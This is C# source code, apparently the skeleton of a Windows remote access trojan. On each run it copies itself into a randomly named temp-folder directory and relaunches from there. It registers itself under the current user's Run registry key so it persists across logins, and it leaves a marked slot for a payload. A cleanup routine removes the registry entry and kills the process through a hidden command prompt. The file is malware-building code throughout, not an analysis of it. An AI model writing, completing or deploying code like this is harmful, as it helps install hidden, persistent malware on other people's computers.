using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace RAT
{
    class Program
    {
        /*
         * This is a RAT to remove please redownload and execute <Filename>.exe /clean
         * 
         * 
         * 
         */
        public static String ran = "";
        public static void random()
        {
            Random rnd = new Random();
            int length = 30;
            for (var i = 0; i < length; i++)
            {
                ran += ((char)(rnd.Next(1, 26) + 64)).ToString();
            }
        }
        public static String[] files = new string[]
        {
            Path.GetTempPath()+"CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316"
        };
        static void Main(string[] args)
        {
            try
            {
                random();
                Console.WriteLine("[!] Starting");
                try
                {
                    if (args[0].Contains("clean")) { cleanup(); }
                }
                catch { }
                Console.WriteLine("[!] Skipping Clean");
                Console.WriteLine("[!] Hiding");
                try
                {
                    String[] fileloc = File.ReadAllLines(files[0]);
                    if (System.Reflection.Assembly.GetExecutingAssembly().Location.Contains(Path.GetTempPath() + fileloc[0]))
                    {
                        Console.WriteLine("[!] Hiding Done");
                        Console.WriteLine("[!] Adding as startup program");
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Adds to startup programs
                        key.SetValue(fileloc[0], System.Reflection.Assembly.GetExecutingAssembly().Location);
                        /*
                         * START PAYLOAD HERE
                         */
                        

                    }
                }
                catch (Exception e) { Console.WriteLine(e); }
                Hide();
                Console.ReadLine();
            }
            catch
            {
                cleanup();
            }
        }
        public static void Hide()
        {

            try
            {
                using (StreamWriter sw = File.CreateText(files[0]))
                {
                    sw.Write(ran);
                }
            }
            catch { }
            String[] loc = File.ReadAllLines(files[0]);
            bool found = false;
            foreach (String check in loc)
            {
                if (Directory.Exists(Path.GetTempPath() + check))
                {
                    found = true;
                    break;
                }
            }
            try
            {
                Directory.CreateDirectory(Path.GetTempPath() + loc[0]);
                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + loc[0] + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
                restart(loc[0]);
            }
            catch
            {
                restart(loc[0]);
            }
        }
        public static void restart(String loc)
        {
            try
            {
                System.Diagnostics.Process.Start(Path.GetTempPath() + loc + "\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe");
                System.Environment.Exit(1);
            }
            catch
            {
                cleanup();
            }

        }
        public static void cleanup()
        {
            String[] fileloc = File.ReadAllLines(files[0]);
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue(fileloc[0], false);
            String exec = " taskkill /f /im CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316.exe";
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + exec;
            process.StartInfo = startInfo;
            process.Start();
            try
            {
                String[] loc = File.ReadAllLines(files[0]);
                Directory.Delete(Path.GetTempPath() + loc[0], true);
            }
            catch { Console.WriteLine("[!] Failed Deepclean doing essential clean"); }
            foreach (String file in files)
            {
                try
                {
                    Directory.Delete(file);
                }
                catch
                {
                    File.Delete(file);
                }
            }
            System.Environment.Exit(1);
        }
    }
}
